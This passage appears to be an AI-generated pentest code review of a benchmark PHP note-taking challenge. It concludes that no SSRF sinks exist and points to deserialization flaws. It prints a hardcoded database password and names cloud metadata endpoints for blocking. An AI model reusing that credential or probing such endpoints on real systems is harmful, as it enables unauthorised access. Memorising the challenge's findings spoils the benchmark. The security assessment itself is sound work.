- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/index.php` (78 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-in.php` (51 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/sign-up.php` (34 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/logout.php` (8 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/misc.php` (9 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php` (6 lines)
- `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/user-profile.php` (7 lines)

**Pattern Searches Performed (All Negative Results):**

### HTTP(S) Clients - NOT FOUND
- ❌ `file_get_contents()` - No instances with URL context
- ❌ `fopen()` - No instances with URL wrappers (http://, https://, ftp://)
- ❌ `curl_init()`, `curl_setopt()`, `curl_exec()` - No cURL usage
- ❌ `fsockopen()`, `stream_socket_client()` - No raw socket operations
- ❌ `guzzle`, `httpclient`, or other HTTP libraries - No third-party dependencies

### Raw Sockets & Network APIs - NOT FOUND
- ❌ `socket_create()`, `socket_connect()` - No socket programming
- ❌ `stream_context_create()` with network streams - Not used

### URL Openers & File Includes - STATIC ONLY
**File Inclusion Analysis:**
- ✓ `include 'user-profile.php';` (index.php, sign-in.php) - Static, no user input
- ✓ `include 'config.php';` (index.php, sign-in.php, sign-up.php) - Static, no user input
- ✓ `include 'misc.php';` (index.php, sign-in.php, sign-up.php) - Static, no user input
- **Result:** All include/require statements use hardcoded string literals, no dynamic path construction, no user input in file paths

### Redirect & "Next URL" Handlers - STATIC DESTINATIONS ONLY
**Redirect Analysis:**
All redirect operations found use hardcoded destinations with no user input:

1. **sign-up.php line 26:**
   ```php
   header("Location: sign-in.php");
   ```
   Static redirect to login page after registration.

2. **sign-in.php line 40:**
   ```php
   header("Location: index.php");
   ```
   Static redirect to main application after successful authentication.

3. **index.php line 9:**
   ```php
   header("Location: sign-in.php");
   ```
   Static redirect to login when authentication check fails.

4. **logout.php line 6:**
   ```php
   header("Location: sign-in.php");
   ```
   Static redirect to login after session termination.

**Conclusion:** No open redirect vulnerability, no user-controlled redirect destinations, no query parameters like `?next=`, `?redirect=`, or `?return_url=` accepted by the application.

### External API Integrations - NOT FOUND
- ❌ No OAuth client libraries or token exchange endpoints
- ❌ No payment gateway integrations (Stripe, PayPal, etc.)
- ❌ No third-party API calls (weather, maps, social media)
- ❌ No webhook senders or HTTP callbacks
- ❌ No SMTP client with user-controlled destination (no email functionality)

### Database Connections - STATIC CONFIGURATION ONLY
**Database Connection Analysis:**
Configuration in `/Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-081-24/php/challenge/config.php`:
```php
$db_host = 'mysql_db';       // Static hostname (Docker service name)
$db_database = 'db';          // Static database name
$db_username = 'db_username'; // Static username
$db_password = 'pCxvkPyS9JYq27BVdUX4N8'; // Static password
```

Connection instantiation:
```php
$conn = new mysqli($db_host, $db_username, $db_password, $db_database);
```

**Result:** All connection parameters are hardcoded constants, no user input influences database host, port, or connection string. Cannot be exploited for SSRF to internal services or cloud metadata endpoints.

### Media Processors - NOT FOUND
- ❌ No image processing libraries (GD, ImageMagick, GraphicsMagick)
- ❌ No PDF generation from URLs (wkhtmltopdf, Puppeteer, etc.)
- ❌ No document converters with URL inputs
- ❌ No video processing (FFmpeg) with network sources

### Link Preview & Unfurlers - NOT FOUND
- ❌ No URL metadata extraction
- ❌ No Open Graph parser
- ❌ No oEmbed implementations
- ❌ No link preview generation for notes

**Application Design:** Notes are plain text stored in TEXT fields with no rich content, URL parsing, or link expansion features.

### Webhook Testers & Callback Verifiers - NOT FOUND
- ❌ No "ping my webhook" functionality
- ❌ No outbound HTTP callbacks for event notifications
- ❌ No webhook configuration in notes or user profiles
- ❌ No API endpoint validation tools

### SSO/OIDC Discovery & JWKS Fetchers - NOT FOUND
- ❌ No OpenID Connect implementation
- ❌ No JWKS endpoint fetching for JWT validation
- ❌ No OAuth authorization server metadata retrieval
- ❌ No SAML metadata parsing
- ❌ Application uses only username/password authentication with local database

### Importers & Data Loaders - NOT FOUND
- ❌ No "import from URL" functionality
- ❌ No CSV/JSON/XML remote file loading
- ❌ No RSS/Atom feed readers
- ❌ No data synchronization with external sources

### Package/Plugin/Theme Installers - NOT FOUND
- ❌ No "install from URL" features
- ❌ No plugin/theme management system
- ❌ No package installer with remote sources
- ❌ Application has no extension/plugin architecture

### Monitoring & Health Check Frameworks - INFRASTRUCTURE ONLY
**Docker Health Checks (Out of Scope):**
Docker Compose defines health checks at infrastructure level:
- MySQL healthcheck: `mysqladmin ping --host=mysql_db` (line 9)
- Apache healthcheck: `curl -f http://127.0.0.1:80/` (line 20)

**Analysis:** These are Docker infrastructure health checks, not application-level functionality. They are NOT triggered by user input, NOT accessible via network requests to the application, and NOT modifiable through any application interface. They are out-of-scope as per the "Locally Executable Only" exclusion criteria.

### Cloud Metadata Helpers - NOT FOUND
- ❌ No AWS instance metadata service calls (http://169.254.169.254/)
- ❌ No GCP metadata server access (http://metadata.google.internal/)
- ❌ No Azure instance metadata service calls
- ❌ No Kubernetes service discovery API calls
- ❌ No Docker API access via unix socket

**Environment:** Application runs in Docker containers with no cloud provider-specific integrations or metadata service access.

### Conclusion and Risk Assessment

**SSRF Risk Level:** NONE - The application architecture fundamentally does not include any functionality that would require server-side outbound HTTP requests or network operations beyond database connectivity. This is a deliberate design choice for a simple note-taking application focused on demonstrating deserialization vulnerabilities rather than SSRF attack vectors.

**Attack Surface:** The application's complete lack of SSRF sinks actually represents a **positive security decision** by reducing the attack surface. Even if the deserialization vulnerability were to be exploited for RCE (remote code execution), an attacker would not have built-in application functionality to pivot to internal network reconnaissance, cloud metadata service exploitation, or internal service port scanning.

**Why No SSRF Sinks Exist:**
1. **Application Purpose:** Simple CRUD note-taking app with no features requiring external data fetching
2. **No Rich Content:** Notes are plain text, no URL expansion, no image/video embedding
3. **No Integrations:** No OAuth, no payment gateways, no third-party APIs
4. **Static Configuration:** All network destinations (database host) are hardcoded
5. **No Admin Panel:** No server management features that might include URL validation or webhook testing

**Potential Future SSRF Risks (If Features Added):**
If the application were to be extended with features like:
- Avatar upload via URL
- Note attachments from URLs
- RSS feed import for notes
- Webhook notifications for note changes
- OAuth/SSO integration
Then SSRF vulnerabilities could be introduced and would require careful validation of any user-controlled URLs including protocol allowlists (http/https only), domain allowlists, IP address blacklists (blocking 127.0.0.1, 169.254.169.254, etc.), and redirect following restrictions.

**Recommendation:** During penetration testing, SSRF testing can be **deprioritized or skipped entirely** for this application, focusing instead on the critical insecure deserialization and authorization bypass vulnerabilities which represent the actual attack surface.

---

**PRE-RECON CODE ANALYSIS COMPLETE**